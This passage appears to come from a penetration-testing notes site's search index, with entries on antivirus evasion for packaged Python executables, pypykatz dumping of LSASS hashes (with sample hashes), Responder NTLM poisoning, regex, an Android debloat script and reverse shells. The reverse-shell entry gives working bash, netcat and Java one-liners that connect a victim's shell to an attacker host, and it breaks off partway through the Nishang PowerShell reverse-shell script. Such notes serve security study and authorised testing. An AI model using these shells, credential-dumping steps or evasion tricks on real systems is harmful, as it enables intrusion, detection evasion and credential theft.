/path/to/yourscript.py --noupx\u00a0 \u00a0\n\n# --noupx: Do not use UPX\n</code></pre> <p>Or even other software to export into EXE.</p> <p>IF\u00a0the antivirus (heuristic based) did catch your exe after opening it, then you need to change the structure or the order of your source code:</p> <ul> <li>Add some random delay.</li> <li>Add some random operations like create a text file, append random text and then delete the file.</li> <li>Change the order of doing things.</li> <li>Offload some operations/commands to subprocess.</li> </ul> <p>Tips:</p> <p>Never blindly rely on Anti-Virus Sandbox Vmware to test an EXE.</p>","tags":["pentesting","python"]},{"location":"pypykatz/","title":"<code>pypykatz</code>","text":"<p>Mimikatz implementation in pure Python.  Runs on all OS's which support python&gt;=3.6</p>","tags":["windows","dump hashes","passwords"]},{"location":"pypykatz/#installation","title":"Installation","text":"<p>Download from github repo: https://github.com/skelsec/pypykatz.</p>","tags":["windows","dump hashes","passwords"]},{"location":"pypykatz/#basic-usage","title":"Basic usage","text":"<pre><code>pypykatz lsa minidump /home/path/lsass.dmp \n</code></pre> <p>From results, and as an example, we will have this snip:</p> <pre><code>sid S-1-5-21-4019466498-1700476312-3544718034-1001\nluid 1354633\n    == MSV ==\n        Username: bob\n        Domain: DESKTOP-33E7O54\n        LM: NA\n        NT: 64f12cddaa88057e06a81b54e73b949b\n        SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8\n        DPAPI: NA\n</code></pre> <p><code>MSV</code> is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database. Pypykatz extracted the SID, Username, Domain, and even the NT &amp; SHA1 password hashes associated with the bob user account's logon session stored in LSASS process memory.</p> <p>But also, these others:</p> <ul> <li><code>WDIGEST</code> is an older authentication protocol enabled by default in <code>Windows XP</code> - <code>Windows 8</code> and <code>Windows Server 2003</code> - <code>Windows Server 2012</code>. LSASS caches credentials used by WDIGEST in clear-text.</li> <li><code>Kerberos</code> is a network authentication protocol used by Active Directory in Windows Domain environments. Domain user accounts are granted tickets upon authentication with Active Directory. LSASS <code>caches passwords</code>, <code>ekeys</code>, <code>tickets</code>, and <code>pins</code> associated with Kerberos. It is possible to extract these from LSASS process memory and use them to access other systems joined to the same domain.</li> <li><code>DPAPI</code>: The Data Protection Application Programming Interface or DPAPI is a set of APIs in Windows operating systems used to encrypt and decrypt DPAPI data blobs on a per-user basis for Windows OS features and various third-party applications. Here are just a few examples of applications that use DPAPI and what they use it for:</li> </ul> Applications Use of DPAPI <code>Internet Explorer</code> Password form auto-completion data (username and password for saved sites). <code>Google Chrome</code> Password form auto-completion data (username and password for saved sites). <code>Outlook</code> Passwords for email accounts. <code>Remote Desktop Connection</code> Saved credentials for connections to remote machines. <code>Credential Manager</code> Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more. <p>Mimikatz and Pypykatz can extract the DPAPI <code>masterkey</code> for the logged-on user whose data is present in LSASS process memory. This masterkey can then be used to decrypt the secrets associated with each of the applications using DPAPI and result in the capturing of credentials for various accounts.</p>","tags":["windows","dump hashes","passwords"]},{"location":"rar-winrar/","title":"rar - Winrar","text":"","tags":["web","pentesting","tools"]},{"location":"rar-winrar/#installation","title":"Installation","text":"<pre><code> wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz\n\ntar -xzvf rarlinux-x64-612.tar.gz &amp;&amp; cd rar\n</code></pre>","tags":["web","pentesting","tools"]},{"location":"rar-winrar/#basic-use","title":"Basic use","text":"<pre><code>rar a ~/test.rar -p ~/test.\n</code></pre>","tags":["web","pentesting","tools"]},{"location":"rdesktop/","title":"rdesktop","text":"<p>rdesktop is an open source UNIX client for connecting to Windows Remote Desktop Services, capable of natively speaking Remote Desktop Protocol (RDP) in order to present the user's Windows desktop.</p>","tags":["tools","windows","rdp"]},{"location":"rdesktop/#installation","title":"Installation","text":"<p>Preinstalled in Kali.</p> <pre><code>sudo apt-get install rdesktop\n</code></pre>","tags":["tools","windows","rdp"]},{"location":"rdesktop/#basic-usage","title":"Basic usage","text":"<pre><code>rdesktop $ip\n\n# Mounting a Linux Folder Using rdesktop\nrdesktop $ip -d &lt;domain&gt; -u &lt;username&gt; -p &lt;'Password0@'&gt; -r disk:linux='/home/user/rdesktop/files'\n</code></pre>","tags":["tools","windows","rdp"]},{"location":"regex/","title":"Mastering Regular Expressions - Regex","text":"<p>The implementation system of regex functionality is often called \"regular expression engine\". Basically a regex engine tries to match the pattern to the given string. There are two main types of regex engines: DFA and NFA, also referred to as text-directed and regex-directed engines. </p> <p> h you can build complex patterns that can match a wide range of combinations.</p> Metacharacter Description . Any single character ^ Match the beginning of a line $ Match the end of a line a|b Match either a or b \\d any digit \\D Any non-digit character \\w Any word character \\W Any non-word character \\s matches any whitespace character \\S Match any non-whitespace character \\b Matches a word boundary \\B Match must not occur on a\u00a0\\b\u00a0boundary. [\\b] Backspace character \\xYY Match hex character YY \\ddd Octal character ddd <code>[]</code> Start/close a charaters class <code>()</code> Start/close a characters group <code>\\</code> Escape special characters | It means OR <code>{}</code> Start/close repetitions of a characters class <p>Quantifiers</p> Regex Quantifier Description + + indicates that the previous character must occur at least one or more times. ? ? indicates that the preceding character is optional. It means the preceding character can occur zero or one time. * Matches zero or more of the preceding character. {n} Matches exactly n occurrences of the preceding character. {n,} Matches n or more occurrences of the preceding character. {n,m} Matches between n and m occurrences of the preceding element <p>The followings are common examples of character classes:</p> <ul> <li><code>[abc]</code> - matches any one character that is either 'a', 'b', or 'c'.</li> <li><code>[a-z]</code> - matches any one lowercase letter from 'a' to 'z'.</li> <li><code>[A-Z]</code> - matches any one upper case letter from 'A' to 'Z'.</li> <li><code>[0-9]</code> - matches any one digit from '0' to '9'. Optionaly, use \\d metacharacter.</li> <li><code>[^abc]</code> - matches any one character that is not 'a', 'b', or 'c'.</li> <li><code>[\\w]</code> - matches any one-word character, including letters, digits, and underscore.</li> <li><code>[\\s]</code> - matches any whitespace character, including space, tab, and newline.</li> <li><code>[^a-z]</code> - matches any one character that is not a lowercase letter from 'a' to 'z'.</li> </ul> <p>In regex, any subpattern enclosed within the parentheses () is considered a group. For example,\u00a0<code>(xyz)</code>\u00a0creates a group that matches the exact sequence \"xyz\".</p> Non-printing character Description \\0 NULL Byte. In many programming language marks the end of a string \\b Within a character class represent the backspace character, while outside <code>\\b</code> matches a word boundary \\t Tab key. \\n New line \\v Vertical tabulation \\f Form feed \\r In HTTP the <code>\\r\\n</code> sequence is used as the end-of-line marker \\e Escape character"},{"location":"regex/#unicode","title":"Unicode","text":"<p>Regular expression flavors that work with Unicode use specific meta-sequences to match code points:</p> <pre><code># `\\u`+code-point \n\ncode-point is the hexadecimal number of the character to match \n`\\u2603`\n\n# `\\x`{code-point} in the PCRE library in Apache and PHP\n{code-point} is the hexadecimal number of the character to match \n`\\x{2603}`\n</code></pre>"},{"location":"regshot/","title":"regshot","text":"<p>regshot helps you to identify changes in Registry made by a Thick client application.  It's used to compare the amount of registry entries that have been changed during an installation or a change in your system settings.</p>"},{"location":"regshot/#installation","title":"Installation","text":"<p>Download from: https://sourceforge.net/projects/regshot/</p>"},{"location":"regshot/#usage","title":"Usage","text":"<p>From the course  Pentesting thick clients applications.</p> <p>1.  Run  regshot version according to your thick-app (84 or 64 v).</p> <p>2. Click on \"First shot\". It will make a \"shot\" of the existing registry entries.</p> <p>3. Open the app you want to test and login into it.</p> <p>4. Perform some kind of action, like for instance, viewing the profile.</p> <p>5. Take a \"Second shot\" of the Registry entries.</p> <p>6. After that, you will see the button \"Compare\" enabled. Click on it.</p> <p></p> <p></p> <p>An HTML file will be generated and you will see the registry entries:</p> <p></p> <p>An interesting registry is \"isLoggedIn\", that has change from false to true. This may be a potential vector of attack (we could set it to true and also change username to admin). </p> <pre><code>HKU\\S-1-5-21-1067632574-3426529128-2637205584-1000\\dvta\\isLoggedIn: \"false\"  \nHKU\\S-1-5-21-1067632574-3426529128-2637205584-1000\\dvta\\isLoggedIn: \"true\"\n</code></pre> <p></p>"},{"location":"remove-bloatware/","title":"Remove bloatware from android phones","text":"<p>Android Debug Bridge - adb cheat sheet.</p> <p>First of all, make sure you have enabled Developer mode in your mobile. Afterward, enable \"USB Debug mode\" (Depuraci\u00f3n USB in spanish). </p> <p>1. Connect mobile to computer with USB cable. </p> <p>2. Press \"File Transfer\" in mobile.</p> <p>3. In laptop, open a terminal and run:</p> <pre><code># Check if device is connected. \nadb devices\n</code></pre> <p>4. If device is well connected, mobile will be prompted to accept the computer connection.</p> <p>5. Access the device from terminal:</p> <pre><code>adb shell\n</code></pre> <p>Now you can uninstall packages.</p>"},{"location":"remove-bloatware/#basic-commands","title":"Basic commands","text":"<pre><code># Uninstall app\npm uninstall --user 0 app.package.name\n\n# Deactivate app\npm disable-user app.package.name\n</code></pre>"},{"location":"remove-bloatware/#list-of-xiaomi-trash","title":"List of xiaomi trash","text":"<ul> <li>com.miui.analytics: analytic  de anal\u00edtica de Xiaomi.</li> <li>com.xiaomi.mipicks:  apps store. Occasionaly it displays adds.</li> <li>com.miui.msa.global: servicio de anuncios y publicidad de MIUI.</li> <li>com.miui.cloudservice | com.miui.cloudservice.sysbase | com.miui.newmidrive: herramientas de Mi Cloud.</li> <li>com.miui.cloudbackup: herramienta de copia de seguridad en la nube Mi Cloud Backup.</li> <li>com.miui.backup: herramienta de copias de seguridad de MIUI.</li> <li>com.xiaomi.glgm: herramienta de juegos de Xiaomi.</li> <li>comn.xiaomi.payment | com.mipay.wallet.in:\u00a0herramientas de pagos m\u00f3viles de Xiaomi.</li> <li>com.tencent.soter.soterserver: funci\u00f3n de pagos m\u00f3viles a trav\u00e9s de WeChat y otros servicios populares en China.</li> <li>cn.wps.xiaomi.abroad.lite: Mi DocViewer, herramienta de visualizaci\u00f3n de documentos PDF.</li> <li>com.miui.videoplayer: reproductor Mi Video.</li> <li>com.miui.player: reproductor Mi Music.</li> <li>com.mi.globalbrowser: navegador Mi Browser.</li> <li>com.mi.midrop: herramienta ShareMe para compartir archivos con otros dispositivos Xiaomi.</li> <li>com.miui.yellowpage: Mi YellowPages, sistema de protecci\u00f3n anti-spam telef\u00f3nico.</li> <li>com.miui.android.fashiongallery: carrusel de fondos de pantalla.</li> <li>com.miui.bugreport | com.miui.miservice: herramientas para reportar fallos de MIUI.</li> <li>com.miui.weathe2: app del tiempo de Xiaomi.</li> <li>com.xiaomi.joyose: herramientas de anal\u00edtica y publicidad.</li> <li>com.zhiliaoapp.musically: TikTok</li> <li>com.facebook.katana: app de Facebook.</li> <li>com.facebook.services: servicios de Facebook.</li> <li>com.facebook.system:\u00a0instalador de apps de Facebook.</li> <li>com.facebook.appmanager: gestor de aplicaciones de Facebook.</li> <li>com.ebay.mobile | com.ebay.carrier: app de eBay</li> <li>com.alibaba.aliexpresshd: app de AliExpress.</li> </ul> <p>More suggestion to remove bloatware from this repo: xiaomi_debloat.sh</p> <pre><code>pm uninstall --user 0 com.android.inputmethod.latin\npm uninstall --user 0 com.android.camera2\npm uninstall --user 0 com.android.providers.partnerbookmarks\npm uninstall --user 0 com.android.emergency\npm uninstall --user 0 com.android.printspooler\npm uninstall --user 0 com.android.apps.tag\npm uninstall --user 0 com.android.dreams.basic\npm uninstall --user 0 com.android.dreams.phototable\npm uninstall --user 0 com.android.magicsmoke\npm uninstall --user 0 com.android.managedprovisioning\npm uninstall --user 0 com.android.noisefield\npm uninstall --user 0 com.android.phasebeam\npm uninstall --user 0 com.android.wallpaper.holospiral\npm uninstall --user 0 com.android.stk\npm uninstall --user 0 com.android.bluetoothmidiservice\npm uninstall --user 0 com.android.browser\npm uninstall --user 0 com.android.cellbroadcastreciever\npm uninstall --user 0 com.android.hotwordenrollment.okgoogle\npm uninstall --user 0 com.android.printservice.recommendation\npm uninstall --user 0 com.android.quicksearchbox\npm uninstall --user 0 com.android.email\npm uninstall --user 0 com.android.bips\npm uninstall --user 0 com.android.hotwordenrollment.xgoogle\npm uninstall --user 0 com.android.chrome\npm uninstall --user 0 com.android.webview\npm uninstall --user 0 com.android.calendar\npm uninstall --user 0 com.android.providers.calendar\npm uninstall --user 0 android.romstats\npm uninstall --user 0 com.android.documentsui\npm uninstall --user 0 com.android.globalFileexplorer\npm uninstall --user 0 com.android.midrive\npm uninstall --user 0 com.android.calculator2\npm uninstall --user 0 com.android.soundrecorder\npm uninstall --user 0 com.android.musicfx\npm uninstall --user 0 com.android.bookmarkprovider\npm uninstall --user 0 com.android.gallery3d\npm uninstall --user 0 com.android.calllogbackup\npm uninstall --user 0 com.android.traceur\npm uninstall --user 0 com.sec.android.AutoPreconfig\npm uninstall --user 0 com.sec.android.service.health\n\n\n# Google apps:\npm uninstall --user 0 com.google.android.tts\npm uninstall --user 0 com.google.android.apps.googleassistant\npm uninstall --user 0 com.google.android.apps.setupwizard.searchselector\npm uninstall --user 0 com.google.android.pixel.setupwizard\npm uninstall --user 0 com.google.android.gm\npm uninstall --user 0 com.google.android.calendar\npm uninstall --user 0 com.google.android.calculator\npm uninstall --user 0 com.google.android.apps.recorder\npm uninstall --user 0 com.google.android.printservice.recommendation\npm uninstall --user 0 com.google.android.apps.books\npm uninstall --user 0 com.google.android.apps.cloudprint\npm uninstall --user 0 com.google.android.apps.currents\npm uninstall --user 0 com.google.android.apps.fitness\npm uninstall --user 0 com.google.android.apps.photos\npm uninstall --user 0 com.google.android.apps.plus\npm uninstall --user 0 com.google.android.apps.tachyon\npm uninstall --user 0 com.google.android.music\npm uninstall --user 0 com.google.android.apps.wellbeing\npm uninstall --user 0 com.google.android.email\npm uninstall --user 0 com.google.android.googlequicksearchbox\npm uninstall --user 0 com.google.android.talk\npm uninstall --user 0 com.google.android.syncadapters.contacts\npm uninstall --user 0 com.google.android.videos\npm uninstall --user 0 com.google.tango.measure\npm uninstall --user 0 com.google.android.youtube\npm uninstall --user 0 com.google.android.apps.docs\npm uninstall --user 0 com.google.ar.lens\npm uninstall --user 0 com.google.android.apps.restore\npm uninstall --user 0 com.google.android.soundpicker\npm uninstall --user 0 com.google.android.syncadapters.calendar\npm uninstall --user 0 com.google.ar.core\npm uninstall --user 0 com.google.android.setupwizard\npm uninstall --user 0 com.google.android.apps.wallpaper\npm uninstall --user 0 com.google.android.projection.gearhead\npm uninstall --user 0 com.google.android.marvin.talkback\npm uninstall --user 0 com.google.android.inputmethod.latin\n\n\n#Xiaomi/MIUI/Baidu stuff:\n\npm uninstall --user 0 com.mi.health\npm uninstall --user 0 com.miui.zman\npm uninstall --user 0 com.miui.freeform\npm uninstall --user 0 com.miui.miwallpaper.earth\npm uninstall --user 0 com.miui.miwallpaper.mars\npm uninstall --user 0 com.miui.newmidrive\npm uninstall --user 0 cn.wps.xiaomi.abroad.lite\npm uninstall --user 0 com.miui.miservice\npm uninstall --user 0 com.xiaomi.mi_connect_service\npm uninstall --user 0 com.xiaomi.miplay_client\npm uninstall --user 0 com.miui.mishare.connectivity\npm uninstall --user 0 com.miui.huanji\npm uninstall --user 0 com.miui.misound\npm uninstall --user 0 com.xiaomi.mirecycle\npm uninstall --user 0 com.miui.cloudbackup\npm uninstall --user 0 com.miui.backup\npm uninstall --user 0 com.mfashiongallery.emag\npm uninstall --user 0 com.miui.accessibility\npm uninstall --user 0 com.xiaomi.account\npm uninstall --user 0 com.xiaomi.xmsf\npm uninstall --user 0 com.xiaomi.simactivate.service\npm uninstall --user 0 com.miui.daemon\npm uninstall --user 0 com.miui.cloudservice.sysbase\npm uninstall --user 0 com.mi.webkit.core\npm uninstall --user 0 com.sohu.inputmethod.sogou.xiaomi\npm uninstall --user 0 com.miui.notes\npm uninstall --user 0 com.bsp.catchlog\npm uninstall --user 0 com.miui.vsimcore\npm uninstall --user 0 com.xiaomi.scanner\npm uninstall --user 0 com.miui.greenguard\npm uninstall --user 0 com.miui.android.fashiongallery\npm uninstall --user 0 com.miui.cloudservice\npm uninstall --user 0 com.miui.micloudsync\npm uninstall --user 0 com.miui.enbbs\npm uninstall --user 0 com.mi.android.globalpersonalassistant\npm uninstall --user 0 com.mi.globalTrendNews\npm uninstall --user 0 com.milink.service\npm uninstall --user 0 com.mipay.wallet.id\npm uninstall --user 0 com.mipay.wallet.in\npm uninstall --user 0 com.miui.analytics\npm uninstall --user 0 com.miui.bugreport\npm uninstall --user 0 com.miui.cleanmaster\npm uninstall --user 0 com.miui.hybrid.accessory\npm uninstall --user 0 com.miui.miwallpaper\npm uninstall --user 0 com.miui.msa.global\npm uninstall --user 0 com.miui.touchassistant\npm uninstall --user 0 com.miui.translation.kingsoft\npm uninstall --user 0 com.miui.translation.xmcloud\npm uninstall --user 0 com.miui.translation.youdao\npm uninstall --user 0 com.miui.translationservice\npm uninstall --user 0 com.miui.userguide\npm uninstall --user 0 com.miui.virtualsim\npm uninstall --user 0 com.miui.yellowpage\npm uninstall --user 0 com.miui.videoplayer\npm uninstall --user 0 com.miui.weather2\npm uninstall --user 0 com.miui.player\npm uninstall --user 0 com.miui.screenrecorder\npm uninstall --user 0 com.miui.providers.weather\npm uninstall --user 0 com.miui.compass\npm uninstall --user 0 com.miui.calculator\npm uninstall --user 0 com.xiaomi.vipaccount\npm uninstall --user 0 com.xiaomi.channel\npm uninstall --user 0 com.mipay.wallet\npm uninstall --user 0 com.xiaomi.pass\npm uninstall --user 0 com.xiaomi.shop\npm uninstall --user 0 com.xiaomi.joyose\npm uninstall --user 0 com.xiaomi.providers.appindex\npm uninstall --user 0 com.miui.fm\npm uninstall --user 0 com.mi.liveassistant\npm uninstall --user 0 com.xiaomi.gamecenter.sdk.service\npm uninstall --user 0 com.xiaomi.payment\npm uninstall --user 0 com.baidu.input_mi\npm uninstall --user 0 com.xiaomi.ab\npm uninstall --user 0 com.xiaomi.jr\npm uninstall --user 0 com.baidu.duersdk.opensdk\npm uninstall --user 0 com.miui.hybrid\npm uninstall --user 0 com.baidu.searchbox\npm uninstall --user 0 com.xiaomi.glgm\npm uninstall --user 0 com.xiaomi.midrop\npm uninstall --user 0 com.xiaomi.mipicks\npm uninstall --user 0 com.miui.personalassistant\npm uninstall --user 0 com.miui.audioeffect\npm uninstall --user 0 com.miui.cit\npm uninstall --user 0 com.miui.qr\npm uninstall --user 0 com.miui.nextpay\npm uninstall --user 0 com.xiaomi.o2o\n\n\n#Xiaomi.eu:\npm uninstall --user 0 pl.zdunex25.updater\n\n\n#RevolutionOS: (not well tested)\npm uninstall --user 0 ros.ota.updater\n\n#SyberiaOS: (not well tested)\npm uninstall --user 0 com.syberia.ota\npm uninstall --user 0 com.syberia.SyberiaPapers\n\n\n#LineageOS: (not well tested)\npm uninstall --user 0 org.lineageos.recorder\npm uninstall --user 0 org.lineageos.snap\n\n\n#Paranoid Android:\npm uninstall --user 0 com.hampusolsson.abstruct\npm uninstall --user 0 code.name.monkey.retromusic\n\n#Other stuff:\npm uninstall --user 0 com.autonavi.minimap\npm uninstall --user 0 com.caf.fmradio\npm uninstall --user 0 com.opera.preinstall\npm uninstall --user 0 com.qualcomm.qti.perfdump\npm uninstall --user 0 com.duokan.phone.remotecontroller\npm uninstall --user 0 com.samsung.aasaservice\npm uninstall --user 0 org.simalliance.openmobileapi.service\npm uninstall --user 0 com.duokan.phone.remotecontroller.peel.plugin\npm uninstall --user 0 com.facemoji.lite.xiaomi\npm uninstall --user 0 com.facebook.appmanager\npm uninstall --user 0 com.facebook.katana\npm uninstall --user 0 com.facebook.services\npm uninstall --user 0 com.facebook.system\npm uninstall --user 0 com.netflix.partner.activation\n\n\n# !EXPERIMENTAL STUFF!\n\n\n#GPS &amp; Location debloat\n#Uninstalling these may break apps like Waze.\n#You have been warned.\npm uninstall --user 0 com.android.location.fused\npm uninstall --user 0 org.codeaurora.gps.gpslogsave\npm uninstall --user 0 com.google.android.gms.location.history\npm uninstall --user 0 com.qualcomm.location\npm uninstall --user 0 com.xiaomi.bsp.gps.nps\npm uninstall --user 0 com.xiaomi.location.fused\n\n\n#Use this if you don't like the stock MIUI launcher.\n#Uninstalling this without basic setup and an alternative launcher will make the device unstable or softbricked.\n#You can't downgrade to a lower version of MIUI launcher after uninstalling this.\n#You have been warned.\npm uninstall --user 0 com.miui.home\n\n\n#Always-on Display removal\n#Not recommended, and not well-tested in daily usage\n#You have been warned.\npm uninstall --user 0 com.miui.aod\n</code></pre>"},{"location":"responder/","title":"Responder.py - A SMB server to listen to NTLM hashes","text":"<p>Mitre ATT&amp;CK lists this technique as\u00a0ID: T1557.001,\u00a0<code>Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay</code>.</p> <p>Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication. </p> <p>Responder can do many different kinds of attacks. For instance we may set up a malicious SMB server. When the target machine attempts to perform the NTLM authentication to that server, Responder sends a challenge back for the server to encrypt with the user's password. When the server responds, Responder will use the challenge and the encrypted response to generate the NetNTLMv2. While we can't reverse the NetNTLMv2, we can try many different common passwords to see if any generate the same challenge-response, and if we find one, we know that is the password. We can use John The Ripper.</p> <pre><code># Protocols that can be attacked with responder\n- LLMNR\n- DNS\n- MDNS\n- NBNS\n- DHCP\n- ICMP\n- HTTP\n- HTTPS\n- SMB\n- LDAP\n- WebDAV\n- Proxy Auth\n- MSSQL\n- DCE-RPC\n- FTP, POP3, IMAP, and SMTP auth\n</code></pre>","tags":["tools","cheat sheet","python","windows","active directory","ldap","server"]},{"location":"responder/#installation","title":"Installation","text":"<pre><code>git clone https://github.com/lgandx/Responder.git\ncd Responder \nsudo pip install -r requirements.txt\n</code></pre>","tags":["tools","cheat sheet","python","windows","active directory","ldap","server"]},{"location":"responder/#basic-usage","title":"Basic usage","text":"<pre><code>./Responder.py -I [interface] -w -d\n# -I: Set interface \n# -w: Start the WPAD rogue proxy server. Default value is False\n# -d: Enable answers for DHCP broadcast requests. This option will inject a WPAD server in the DHCP response. Default: False\n\n# In the HTB machine responder:\n./Responder.py -I tun0 -w -d\n</code></pre> <p>All saved Hashes are located in Responder's logs directory (<code>/usr/share/responder/logs/</code>). We can copy the hash to a file and attempt to crack it using the hashcat module 5600.</p> <p>Note:\u00a0If you notice multiples hashes for one account this is because NTLMv2 utilizes both a client-side and server-side challenge that is randomized for each interaction. This makes it so the resulting hashes that are sent are salted with a randomized string of numbers. This is why the hashes don't match but still represent the same password.</p> <p>Responder in Analyzing mode:</p> <p>The\u00a0<code>-A</code>\u00a0flag puts us into analyze mode, allowing us to see NBT-NS, BROWSER, and LLMNR requests in the environment without poisoning any responses. </p> <pre><code>sudo responder -I ens224 -A -wf\n# sudo privileges or root to make sure that all ports needed are available on our attack host for it to function best.\n# -w: The use of the -w flag utilizes the built-in WPAD proxy server. This can be highly effective, especially in large organizations, because it will capture all HTTP requests by any users that launch Internet Explorer if the browser has Auto-detect settings enabled.\n# -f: attempts to fingerprint the remote host operating system and version.\n</code></pre> <p>With this configuration shown above, Responder will listen and answer any requests it sees on the wire. If you are successful and manage to capture a hash, Responder will print it out on screen and write it to a log file per host located in the\u00a0<code>/usr/share/responder/logs</code>\u00a0directory.</p> <p>Hashes are also stored in a SQLite database that can be configured in the\u00a0<code>Responder.conf</code>\u00a0config file, typically located in\u00a0<code>/usr/share/responder</code>\u00a0unless we clone the Responder repo directly from GitHub.</p>","tags":["tools","cheat sheet","python","windows","active directory","ldap","server"]},{"location":"responder/#practical-example","title":"Practical example","text":"<p>HackTheBox machine: Responder.</p>","tags":["tools","cheat sheet","python","windows","active directory","ldap","server"]},{"location":"reverse-engineering/","title":"Reverse engineering","text":"","tags":["pentesting","reverse-engineering"]},{"location":"reverse-engineering/#toolkit","title":"Toolkit","text":"<p>IDA pro x64 Ghidra Radare</p>","tags":["pentesting","reverse-engineering"]},{"location":"reverse-engineering/#basic-concepts","title":"Basic concepts","text":"","tags":["pentesting","reverse-engineering"]},{"location":"reverse-engineering/#hardware","title":"Hardware","text":"<p>Registries It's an storage unit. With low capacity, but a high speed. </p> <p>X86 (32 bits) Number of registries 8 general registries (R0 to R7)</p> <p>X64 16 general registries (R8 to R16)</p>","tags":["pentesting","reverse-engineering"]},{"location":"reverse-engineering/#so","title":"SO","text":"<p>Stack Heap Pe Coff - Portable Executable</p>","tags":["pentesting","reverse-engineering"]},{"location":"reverse-engineering/#programs","title":"Programs","text":"<p>call conventions</p>","tags":["pentesting","reverse-engineering"]},{"location":"reverse-engineering/#instructions","title":"Instructions","text":"<p>Have a look at the Intel book.</p>","tags":["pentesting","reverse-engineering"]},{"location":"reverse-shells/","title":"Reverse shells","text":"Resources to generate reverse shells <ul> <li>https://www.revshells.com/</li> <li>Netcat for windows 32/64 bit </li> <li>Pentesmonkey</li> <li>PayloadsAllTheThings </li> </ul> All about shells Shell Type Description <code>Reverse shell</code> Initiates a connection back to a \"listener\" on our attack box. <code>Bind shell</code> \"Binds\" to a specific port on the target host and waits for a connection from our attack box. <code>Web shell</code> Runs operating system commands via the web browser, typically not interactive or semi-interactive. It can also be used to run single commands (i.e., leveraging a file upload vulnerability and uploading a\u00a0<code>PHP</code>\u00a0script to run a single command. <p>Victim's machine Initiates a connection back to a \"listener\" on our attacking machine box. </p> <p>For this attack to work, first  we set the listener in the attacking machine using netcat.</p> <pre><code>nc -lnvp $port\n# By default we will be listening in all network interfaces: 0.0.0.0\n</code></pre> <p>After that, on the victim's machine, you can launch the reverse shell connection. </p> <p>A Reverse Shell is handy when we want to get a quick, reliable connection to our compromised host. However, a Reverse Shell can be very fragile. Once the reverse shell command is stopped, or if we lose our connection for any reason, we would have to use the initial exploit to execute the reverse shell command again to regain our access.</p>","tags":["pentesting","web","pentesting","reverse-shells"]},{"location":"reverse-shells/#reverse-shell-connections","title":"Reverse shell connections","text":"","tags":["pentesting","web","pentesting","reverse-shells"]},{"location":"reverse-shells/#bash","title":"bash","text":"<pre><code>bash -c 'bash -i &gt;&amp; /dev/tcp/$ipAttacker/$port 0&gt;&amp;1'\n</code></pre> <pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.79 4321 &gt;/tmp/f\n\n# rm /tmp/f;\n# Removes the /tmp/f file if it exists, -f causes rm to ignore nonexistent files. The semi-colon (;) is used to execute the command sequentially.\n\n# mkfifo /tmp/f;\n# Makes a FIFO named pipe file at the location specified. In this case, /tmp/f is the FIFO named pipe file, the semi-colon (;) is used to execute the command sequentially.\n\n# cat /tmp/f |\n# Concatenates the FIFO named pipe file /tmp/f, the pipe (|) connects the standard output of cat /tmp/f to the standard input of the command that comes after the pipe (|).\n\n# /bin/sh -i 2&gt;&amp;1 |\n# Specifies the command language interpreter using the -i option to ensure the shell is interactive. 2&gt;&amp;1 ensures the standard error data stream (2) &amp; standard output data stream (1) are redirected to the command following the pipe (|).\n\n# nc $ip &lt;port&gt; &gt;/tmp/f\n# Uses Netcat to send a connection to our attack host $ip listening on port &lt;port&gt;. The output will be redirected (&gt;) to /tmp/f, serving the Bash shell to our waiting Netcat listener when the reverse shell one-liner command is executed\n</code></pre>","tags":["pentesting","web","pentesting","reverse-shells"]},{"location":"reverse-shells/#java","title":"java","text":"<pre><code>r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5&lt;&gt;/dev/tcp/$ipAttacker/$port;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done\"] as String[])\np.waitFor()\n</code></pre>","tags":["pentesting","web","pentesting","reverse-shells"]},{"location":"reverse-shells/#netcat","title":"netcat","text":"<pre><code>nc -e /bin/sh $ipAttacker $port\n\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc $ipAttacker $port &gt;/tmp/f\n</code></pre>","tags":["pentesting","web","pentesting","reverse-shells"]},{"location":"reverse-shells/#nishang-project","title":"nishang project","text":"<p>Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming.  Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. See nishang</p> <pre><code>function Invoke-PowerShellTcp \n{ \n&lt;#\n.SYNOPSIS\nNishang script which can be used for Reverse or Bind interactive PowerShell from a target. \n.DESCRIPTION\nThis script is able to connect to a standard Netcat listening on a port when using the -Reverse switch. \nAlso, a standard Netcat can connect to this script Bind to a specific port.\nThe script is derived from Powerfun written by Ben Turner &amp; Dave Hardy\n.PARAMETER IPAddress\nThe IP address to connect to when using the -Reverse switch.\n.PARAMETER Port\nThe port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.\n.EXAMPLE\nPS &gt; Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444\nAbove shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on \nthe given IP and port. \n.EXAMPLE\nPS &gt; Invoke-PowerShellTcp -Bind -Port 4444\nAbove shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. \n.EXAMPLE\nPS &gt; Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444\nAbove shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be\nlistening on the given IP and port. \n.LINK\nhttp://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html\nhttps://github.com/nettitude/powershell/blob/master/powerfun.ps1\nhttps://github.com/samratashok/nishang\n#&gt;      \n    [CmdletBinding(DefaultParameterSetName=\"reverse\")] Param(\n\n        [Parameter(Position = 0, Mandatory = $true, ParameterSetName=\"reverse\")]\n        [Parameter(Position = 0, Mandatory = $false, ParameterSetName=\"bind\")]\n        [String]\n        $IPAddress,\n\n        [Parameter(Position = 1, Mandatory = $true, ParameterSetName=\"reverse\")]\n        [Parameter(Position = 1, Mandatory = $true, ParameterSetName=\"bind\")]\n        [Int]\n        